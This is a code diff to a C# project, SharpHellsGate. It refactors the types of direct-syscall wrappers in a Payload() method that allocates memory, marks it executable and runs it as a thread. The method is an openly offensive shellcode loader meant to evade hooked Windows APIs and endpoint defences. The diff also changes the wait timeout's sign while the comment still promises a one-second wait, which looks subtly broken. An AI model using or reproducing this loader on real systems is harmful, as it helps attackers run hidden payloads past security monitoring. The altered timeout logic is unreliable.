@@ -1,4 +1,5 @@
 ﻿using System;
+using SharpHellsGate.Win32;
 using System.Runtime.InteropServices;
 
 namespace SharpHellsGate {
@@ -32,8 +33,8 @@ namespace SharpHellsGate {
         }
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate int NtAllocateVirtualMemoryDelegate(
-            IntPtr ProcessHandle,
+        private delegate UInt32 NtAllocateVirtualMemoryDelegate(
+            UIntPtr ProcessHandle,
             ref IntPtr BaseAddress,
             ulong ZeroBits,
             ref ulong RegionSize,
@@ -42,8 +43,8 @@ namespace SharpHellsGate {
         );
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate int NtProtectVirtualMemoryDelegate(
-            IntPtr ProcessHandle,
+        private delegate UInt32 NtProtectVirtualMemoryDelegate(
+            UIntPtr ProcessHandle,
             ref IntPtr BaseAddress,
             ref ulong NumberOfBytesToProtect,
             ulong NewAccessProtection,
@@ -51,8 +52,8 @@ namespace SharpHellsGate {
         );
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate int NtCreateThreadExDelegate(
-            ref IntPtr hThread,
+        private delegate UInt32 NtCreateThreadExDelegate(
+            ref UIntPtr hThread,
             uint DesiredAccess,
             IntPtr ObjectAttributes,
             IntPtr ProcessHandle,
@@ -66,10 +67,10 @@ namespace SharpHellsGate {
         );
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate int NtWaitForSingleObjectDelegate(
-            IntPtr ObjectHandle,
+        private delegate UInt32 NtWaitForSingleObjectDelegate(
+            UIntPtr ObjectHandle,
             bool Alertable,
-            ref Win32.LARGE_INTEGER TimeOuts
+            ref Structures.LARGE_INTEGER TimeOuts
         );
 
         private unsafe T NtInvocation<T>(VxTableEntry Entry) where T: Delegate {
@@ -83,27 +84,28 @@ namespace SharpHellsGate {
             }
         }
 
-        private int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ulong ZeroBits, ref ulong RegionSize, ulong AllocationType, ulong Protect) {
+        private UInt32 NtAllocateVirtualMemory(UIntPtr ProcessHandle, ref IntPtr BaseAddress, ulong ZeroBits, ref ulong RegionSize, ulong AllocationType, ulong Protect) {
             NtAllocateVirtualMemoryDelegate Func = NtInvocation<NtAllocateVirtualMemoryDelegate>(this.Table.NtAllocateVirtualMemory);
             return Func(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
         }
 
-        private int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref ulong NumberOfBytesToProtect, ulong NewAccessProtection, ref ulong OldAccessProtection) {
+        private UInt32 NtProtectVirtualMemory(UIntPtr ProcessHandle, ref IntPtr BaseAddress, ref ulong NumberOfBytesToProtect, ulong NewAccessProtection, ref ulong OldAccessProtection) {
             NtProtectVirtualMemoryDelegate Func = NtInvocation<NtProtectVirtualMemoryDelegate>(this.Table.NtProtectVirtualMemory);
             return Func(ProcessHandle, ref BaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, out OldAccessProtection);
         }
 
-        private int NtCreateThreadEx(ref IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer) {
+        private UInt32 NtCreateThreadEx(ref UIntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer) {
             NtCreateThreadExDelegate Func = NtInvocation<NtCreateThreadExDelegate>(this.Table.NtCreateThreadEx);
             return Func(ref hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, CreateSuspended, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
         }
 
-        private int NtWaitForSingleObject(IntPtr ObjectHandle, bool Alertable, ref Win32.LARGE_INTEGER TimeOuts) {
+        private UInt32 NtWaitForSingleObject(UIntPtr ObjectHandle, bool Alertable, ref Structures.LARGE_INTEGER TimeOuts) {
             NtWaitForSingleObjectDelegate Func = NtInvocation<NtWaitForSingleObjectDelegate>(this.Table.NtWaitForSingleObject);
             return Func(ObjectHandle, Alertable, ref TimeOuts);
         }
 
         public void Payload() {
+
             // Pointers
             IntPtr pBaseAddres = IntPtr.Zero;
             IntPtr pSelfProcess = new IntPtr(-1);
@@ -139,7 +141,7 @@ namespace SharpHellsGate {
             ulong PAGE_EXECUTE_READ = 0x20;
 
             // Allocate Memory
-            int status = NtAllocateVirtualMemory(pSelfProcess, ref pBaseAddres, 0, ref Size, MEM_COMMIT, PAGE_READWRITE);
+            UInt32 status = NtAllocateVirtualMemory(Macros.GetCurrentProcess(), ref pBaseAddres, 0, ref Size, MEM_COMMIT, PAGE_READWRITE);
             if (status != 0x00) {
                 Console.WriteLine("Error ntdll!NtAllocateVirtualMemory");
                 return;
@@ -152,23 +154,24 @@ namespace SharpHellsGate {
 
             // Change memory protection
             ulong OldAccessProtection = 0;
-            status = NtProtectVirtualMemory(pSelfProcess, ref pBaseAddres, ref Size, PAGE_EXECUTE_READ, ref OldAccessProtection);
+            status = NtProtectVirtualMemory(Macros.GetCurrentProcess(), ref pBaseAddres, ref Size, PAGE_EXECUTE_READ, ref OldAccessProtection);
             if (status != 0x00) {
                 Console.WriteLine("Error ntdll!NtProtectVirtualMemory");
                 return;
             }
 
-            IntPtr hThread = IntPtr.Zero;
+            UIntPtr hThread = UIntPtr.Zero;
             status = NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, pSelfProcess, pBaseAddres, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
-            if (hThread == IntPtr.Zero || hThread == IntPtr.Zero) {
+            if (hThread == UIntPtr.Zero || !Macros.NT_SUCCESS(status)) {
                 Console.WriteLine("Error ntdll!NtCreateThreadEx");
                 return;
             }
             Generic.LogInfo($"Thread handle:  0x{hThread:x16}\n");
 
             // Wait for one second
-            Win32.LARGE_INTEGER Timeout = new Win32.LARGE_INTEGER();
-            Timeout.QuadPart = -10000000;
+            Structures.LARGE_INTEGER Timeout = new Structures.LARGE_INTEGER {
+                QuadPart = 10_000_000
+            };
             NtWaitForSingleObject(hThread, false, ref Timeout);
             return;
         }
